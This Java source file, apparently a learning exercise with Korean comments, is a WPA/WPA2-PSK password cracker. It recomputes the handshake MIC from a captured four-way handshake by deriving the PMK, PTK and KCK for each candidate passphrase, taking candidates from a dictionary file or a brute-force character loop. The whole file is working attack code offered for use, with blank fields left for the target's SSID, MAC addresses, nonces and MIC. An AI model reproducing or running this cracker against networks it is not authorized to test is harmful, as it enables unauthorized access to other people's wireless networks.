

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.security.spec.KeySpec;

import javax.crypto.Mac;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class Security {

	public static void main(String[] args) throws Exception {
		String ssid = "";
		String apMac = "";
		String stationMac = ""; // Target station's Mac address
		String anonce = "";
		String snonce = "";
		String mic = "";
		String message2 = "";
		String charSet = "qwertyuiopasdfghjklzxcvbnm1234567890"; // possible password's character set
		String filename = ".txt"; //your dictionary file name
		String filePath = System.getProperty("user.home") + "/" + filename; // your dictionary file path. 

		/* you can choose bruteforce mode or dictionary attack mode*/
		crack_dictionary(ssid, apMac, stationMac, anonce, snonce, mic, message2, filePath);
		crack_bruteforce(ssid, apMac, stationMac, anonce, snonce, mic, message2, 4, charSet);
		
	}

	public static void crack_dictionary(String ssid, String apMac, String stationMac, String anonce, String snonce,
			String mic, String message2, String filePath) throws Exception {

		File file = new File(filePath);
		FileReader filereader = new FileReader(file);
		BufferedReader bufReader = new BufferedReader(filereader);
		String line = "";
		int count = 0;
		while ((line = bufReader.readLine()) != null) {
			String passPhrase = line;
			doCrack(passPhrase, ssid, apMac, stationMac, anonce, snonce, mic, message2);
		}
		System.out.println(count);
		bufReader.close();

	}

	public static void crack_bruteforce(String ssid, String apMac, String stationMac, String anonce, String snonce,
			String mic, String message2, int passPhraseLen, String charSet) throws Exception {
		boolean found = false;
		int[] digit = new int[passPhraseLen];
		for (int i = 0; i < passPhraseLen; i++) {
			digit[i] = 0;
		}
		int i = 0;
		int tmp = 0;
		boolean end = false;
		while (true) {
			if (end)
				break;
			if (i == charSet.length()) {
				i = 0;
				tmp = 0;
				while (true) {
					tmp += 1;
					if (tmp == passPhraseLen) {
						end = true;
						break;
					}
					if (digit[tmp] == charSet.length() - 1) {
						digit[tmp] = 0;
					} else {
						digit[tmp]++;
						digit[0] = 0;
						break;
					}
				}
			}
			if (end)
				break;

			StringBuilder sb = new StringBuilder();
			for (int j = 0; j < passPhraseLen; j++) {
				sb.append(charSet.charAt(digit[j]));
			}
			String passPhrase = sb.toString();
			passPhrase = "0003" + passPhrase;
			i++;
			digit[0] = i;
			found = doCrack(passPhrase, ssid, apMac, stationMac, anonce, snonce, mic, message2);

			if (found)
				break;

		}
		if (!found)
			System.out.println("KEY FOUND FAILED");
	}

	private static boolean doCrack(String passphrase, String ssid, String apMac, String stationMac, String anonce,
			String snonce, String mic, String message2) throws Exception {
		mic = mic.replaceAll(" ", "");
		message2 = message2.replaceAll(" ", "");
		message2 = message2.replaceAll(mic, "00000000000000000000000000000000");

		byte[] pmk = getPmk(passphrase, ssid);
		String ptk = getPTK(pmk, anonce, snonce, apMac, stationMac);
		String kck = getKck(ptk);
		String predicted_mic = getMic(kck, message2);
		if (mic.equals(predicted_mic)) {
			System.out.println("message 2 = " + message2);
			System.out.println();
			System.out.println("PMK = " + byteArray_To_HexString(pmk));
			System.out.println();
			System.out.println("PTK = " + ptk);
			System.out.println();
			System.out.println("KCK = " + kck);
			System.out.println();
			System.out.println("예상 MIC = " + predicted_mic);
			System.out.println("주어진 MIC = " + mic);
			System.out.println();
			System.out.println("KEY FOUND ! [" + passphrase + "]");
			return true;
		}

		return false;

	}

	private static String getMic(String kck, String message) throws Exception {
		SecretKeySpec signingKey = new SecretKeySpec(hexString_To_ByteArray(kck), "HmacSHA1");
		Mac mac = Mac.getInstance("HmacSHA1");
		mac.init(signingKey);

		return byteArray_To_HexString(mac.doFinal(hexString_To_ByteArray(message))).substring(0, 32);

	}

	private static String getKck(String ptk) {
		return ptk.substring(0, 32);
	}

	private static byte[] getPmk(String passphrase, String ssid) throws Exception {
		KeySpec spec = new PBEKeySpec(passphrase.toCharArray(), ssid.getBytes(), 4096, 256);
		SecretKeyFactory fac = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		return fac.generateSecret(spec).getEncoded();
	}

	private static String getPTK(byte[] pmk, String anonce, String snonce, String aa, String sa) throws Exception {

		String A = byteArray_To_HexString("Pairwise key expansion".getBytes()); // 라벨
		String x = min_hex(aa, sa);
		String y = max_hex(aa, sa);
		String z = min_hex(anonce, snonce);
		String w = max_hex(anonce, snonce);

		StringBuilder sb = new StringBuilder();
		String B = sb.append(x).append(y).append(z).append(w).toString();

		String[] X = { "00", "01", "02", "03", "04" };
		StringBuilder ptk = new StringBuilder();
		for (int i = 0; i < 5; i++) {
			StringBuilder sb2 = new StringBuilder();
			sb2.append(A).append("00").append(B).append(X[i]);
			String concat = sb2.toString();
			SecretKeySpec signingKey = new SecretKeySpec(pmk, "HmacSHA1");
			Mac mac = Mac.getInstance("HmacSHA1");
			mac.init(signingKey);
			ptk.append(byteArray_To_HexString(mac.doFinal(hexString_To_ByteArray(concat))));
		}
		return ptk.toString().substring(0, 128);

	}

	public static String max_hex(String hex1, String hex2) {
		for (int i = 0; i < hex1.length(); i++) {
			if (hex1.charAt(i) > hex2.charAt(i)) {
				return hex1;
			} else if (hex1.charAt(i) < hex2.charAt(i)) {
				return hex2;
			}
		}
		return null; // ap nonce와 station nonce가 똑같을확률이 거의없기때문에 그냥 null반환하도록함
	}

	private static String min_hex(String hex1, String hex2) {
		for (int i = 0; i < hex1.length(); i++) {
			if (hex1.charAt(i) < hex2.charAt(i)) {
				return hex1;
			} else if (hex1.charAt(i) > hex2.charAt(i)) {
				return hex2;
			}
		}
		return null;

	}

	private static String byteArray_To_HexString(byte[] bytes) {

		StringBuilder str = new StringBuilder();
		for (int i = 0; i < bytes.length; i++) {
			str.append(String.format("%02x", bytes[i]));
		}

		return str.toString();
	}

	private static byte[] hexString_To_ByteArray(String str) {
		byte[] bytes = new byte[str.length() / 2];
		for (int i = 0; i < str.length(); i += 2) {
			bytes[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
		}
		return bytes;
	}

}
